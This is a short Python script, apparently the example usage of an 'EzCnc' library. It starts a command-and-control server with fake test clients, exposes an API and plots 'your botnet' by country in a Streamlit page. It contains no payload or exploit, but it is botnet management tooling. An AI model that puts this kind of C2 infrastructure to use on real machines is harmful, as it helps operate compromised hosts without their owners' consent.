from EzCnc import CNC
import streamlit as st

app = CNC(
    db_name="Database", name="EZCNC", debug=True, logs_path="EZCNC_logs"
)  # initiate the api

app.generate_fake_clients(50)  # add 50 fake clients for testing and debuging purposes
app.generate_fake_responses()  # add fake responses for the same reason
api = app.api  # exporting the api class so that you can run   "uvicorn main:api"
Database = app.Database  # full database control for your own freedom
Plots = app.plots  # a powerfull ploting class to better visualize your botnet
fig = Plots.countries(graph="bar", by_id=False)
st.plotly_chart(fig)  # showing the plot in a webpage
